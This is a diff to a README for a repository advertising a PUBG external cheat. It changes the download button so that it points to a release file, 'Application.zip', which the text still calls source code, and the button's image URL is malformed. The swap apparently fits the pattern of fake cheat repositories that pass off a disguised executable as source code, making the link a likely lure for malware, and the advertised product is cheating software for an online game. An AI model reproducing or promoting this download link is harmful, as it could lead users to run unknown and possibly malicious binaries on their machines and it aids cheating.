@@ -13,7 +13,7 @@ Welcome to the PUBG External Cheat FULL Feature repository! This cheat source co
 
 ## Installation 🛠️
 To use this cheat source code, you can download the latest version from the following link:  
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)  
+[![Download Source Code](https://github.com/realthugv1/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip%20Code-blue)](https://github.com/realthugv1/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)  
 *(Note: Click on the above button to download the source code.)*
 
 ## Topics 📚
